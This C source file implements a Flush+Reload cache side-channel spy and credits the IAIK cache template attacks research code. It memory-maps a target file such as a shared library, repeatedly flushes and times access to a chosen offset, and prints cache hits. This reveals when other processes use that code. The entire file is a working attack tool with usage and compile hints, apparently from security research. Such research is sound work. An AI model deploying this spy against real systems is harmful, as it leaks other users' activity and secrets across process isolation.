/* Credit to: https://github.com/IAIK/cache_template_attacks/ */
/* Compile with: gcc -std=gnu11 -O2 -o */
#define _GNU_SOURCE
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sched.h>
#include <stdint.h>
#include "cache_utils.h"

#define ARG_NUM_ERR     -1
#define FILE_OPEN_ERR   -2
#define MEM_MAP_ERR     -3

#define MIN_CACHE_MISS_CYCLES (155) /* this number varies on different systems */

size_t kpause = 0;
void flushandreload(void* addr)
{
    size_t time = rdtsc();
    maccess(addr);
    size_t delta = rdtsc() - time;
    flush(addr);
    if (delta < MIN_CACHE_MISS_CYCLES) {
        if (kpause > 0) {
            printf("%lu: Cache Hit (%lu cycles) after a pause of %lu cycles\n", time, delta, kpause);
        }
        kpause = 0;
    } else {
        kpause++;
    }
}

int main(int argc, char** argv)
{
    if (argc != 3) {    
        printf("Usage: ./%s <file> <offset>\n", argv[0]);
        return ARG_NUM_ERR;
    }

    char* name = argv[1];
    char* offsetp = argv[2];
    unsigned int offset = 0;
    !sscanf(offsetp, "%x", &offset);
    int fd = open(name, O_RDONLY);
    if (fd < 3) {
        printf("Error: failed to open file\n");
        return FILE_OPEN_ERR;
    }
    unsigned char* addr = (unsigned char*)mmap(0, 64 * 1024 * 1024, PROT_READ, MAP_SHARED, fd, 0);
    if (addr == (void*)-1 || addr == (void*)0) {
        printf("Error: failed to mmap\n");
        return MEM_MAP_ERR;
    }

    int i;
    while (1) {
        flushandreload(addr + offset);
        for (i = 0; i < 3; ++i)
            sched_yield();
    }
    
    return 0;
}